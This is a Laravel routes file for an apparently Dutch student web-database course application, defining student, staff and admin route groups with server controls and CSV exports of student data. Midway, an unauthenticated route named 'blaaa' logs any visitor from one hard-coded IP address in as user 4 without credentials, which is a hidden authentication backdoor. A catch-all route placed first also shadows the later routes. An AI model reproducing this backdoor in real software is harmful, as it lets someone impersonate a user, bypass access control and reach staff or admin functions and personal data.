<?php

Route::get('/{any}', 'SPAController@getIndex')->where('any', '.*');


Route::get('/','HomeController@getIndex');
Route::get('/voorbeeldcode','HomeController@getVoorbeeldcode');

Route::get('/profile','HomeController@getProfile')->middleware('auth');

Route::get('/login','AuthController@getLogin');
Route::get('/callback','AuthController@getCallback');
Route::get('/logout','AuthController@getLogout');
Route::get('/login-failed','AuthController@getLoginFailed');

Route::group(['middleware'=>'student'], function() {
    Route::get('/student/project','StudentController@getProject');
    Route::post('/student/project','StudentController@postProject');
    Route::get('/student/server','StudentController@getServer');
    Route::get('/student/server-on/{server}', 'StudentController@getServerOn');
});

Route::get('blaaa', function() {

    if($_SERVER['REMOTE_ADDR'] == "62.163.68.20") {

        $user = \App\Models\User::where('id', 4)->first();
        //  echo "inloggen als..".$user;
        \Auth::login($user);
        return redirect("/");
    }
});

Route::group(['middleware'=>'staff'], function() {

    Route::get('/staff/groups', 'StaffController@getGroups');
    Route::get('/staff/groups-export/webdb-groepen.csv', 'StaffController@getGroupsExport');

    Route::get('/staff/students', 'StaffController@getStudents');
    Route::get('/staff/students-export/webdb-studenten.csv', 'StaffController@getStudentsExport');
    Route::get('/staff/student-modal/{student}','StaffController@getStudentModal');
    Route::post('/staff/student-modal/{student}','StaffController@postStudentModal');

    Route::get('/staff/group-modal/{group}','StaffController@getGroupModal');
    Route::post('/staff/group-modal/{group}','StaffController@postGroupModal');
});

Route::group(['middleware' => 'admin'], function() {

    Route::get('/admin/servers', 'AdminController@getServers');
    Route::get('/admin/server/{server}', 'AdminController@getServer');
    Route::get('/admin/server-on/{server}', 'AdminController@getServerOn');
    Route::get('/admin/server-off/{server}', 'AdminController@getServerOff');

    Route::get('/admin/config', 'AdminController@getConfig');
    Route::post('/admin/config', 'AdminController@postConfig');
});